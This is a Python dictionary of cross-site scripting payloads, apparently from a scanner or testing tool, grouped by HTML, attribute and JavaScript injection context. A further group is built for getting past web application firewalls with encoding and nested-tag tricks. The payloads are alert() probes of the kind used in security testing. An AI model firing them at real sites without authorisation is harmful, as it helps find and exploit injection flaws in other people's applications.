PAYLOAD_LIBRARY = {
    'html_context': [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<!--<img src="-->><script>alert(1)</script>'
    ],
    'attribute_context': [
        '" onmouseover=alert("XSS")',
        "'><svg/onload=alert('XSS')>",
        'javascript:alert(1)//'
    ],
    'javascript_context': [
        "'; alert('XSS');//",
        '\\\'; alert(1);//',
        '${alert("XSS")}'
    ],
    'waf_evasion': [
        '<script>alert("XSS")</script>'.encode('utf-16le').decode('latin-1'),
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;>',
        '<scr<script>ipt>alert("XSS")</scr</script>ipt>'
    ]
}